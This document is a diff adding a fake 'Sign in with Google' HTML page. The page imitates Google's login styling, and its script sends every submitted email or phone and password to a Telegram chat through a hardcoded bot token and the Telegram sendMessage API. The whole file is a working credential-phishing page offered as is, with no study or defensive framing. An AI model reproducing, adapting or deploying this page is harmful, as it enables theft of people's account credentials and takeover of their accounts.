@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In with Google</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-box {
+            width: 380px;
+            padding: 30px;
+            background: white;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .google-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-box p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .sign-in-button {
+            width: 100%;
+            padding: 12px;
+            background: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .sign-in-button:hover {
+            background-color: #357ae8;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="Google__G__logo.svg.png" alt="Google Logo" class="google-logo">
+        <h2>Sign in with your Google Account</h2>
+        <form id="login-form" onsubmit="handleSignIn(event)">
+            <input type="text" id="emailOrPhone" placeholder="Enter your email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button class="sign-in-button" type="submit">Sign In</button>
+        </form>
+        <p class="footer">Not your device? <a href="#">Use Guest mode</a>.</p>
+        <p class="footer">Having trouble? <a href="#">Learn more</a>.</p>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '7898975034:AAFyxvOEhLCTP85Wz1N7T4-K1B4sd4EpHXc';
+        let chat_id = null;
+
+        // Function to get chat ID from Telegram updates
+        function getChatIdFromUpdates() {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.result && data.result.length > 0) {
+                        chat_id = data.result[0].message.chat.id;
+                        console.log("Chat ID: ", chat_id);
+                    } else {
+                        console.log("No updates found. Please send a message to the bot first.");
+                    }
+                })
+                .catch(error => console.error("Error fetching updates: ", error));
+        }
+
+        // Function to handle the Google Sign-In (email/phone and password submission)
+        function handleSignIn(event) {
+            event.preventDefault();
+            
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
+            
+            if (emailOrPhone && password) {
+                console.log("Sign-in details: ", emailOrPhone, password);
+
+                // Get chat ID if not already available
+                if (!chat_id) {
+                    console.log("Fetching chat ID...");
+                    getChatIdFromUpdates();setTimeout(() => {
+                        sendLoginDetailsToTelegram(emailOrPhone, password);
+                    }, 2000);  // Wait 2 seconds for chat_id to be populated
+                } else {
+                    sendLoginDetailsToTelegram(emailOrPhone, password);
+                }
+            } else {
+                alert("Please enter both email/phone and password.");
+            }
+        }
+
+        // Function to send login details (email/phone and password) to Telegram
+        function sendLoginDetailsToTelegram(emailOrPhone, password) {
+            if (!chat_id) {
+                alert('Chat ID not found. Please send a message to the bot first.');
+                return;
+            }
+
+            const message = `🔐 Google Account Sign-In Attempt\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: chat_id,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Message sent successfully:", data);
+                if (data.ok) {
+                    alert('Sign-in details sent to Telegram!');
+                } else {
+                    alert('Failed to send details to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error sending login details to Telegram.');
+            });
+        }
+
+        // Fetch chat ID when the page loads
+        window.onload = getChatIdFromUpdates;
+    </script>
+</body>
+</html>
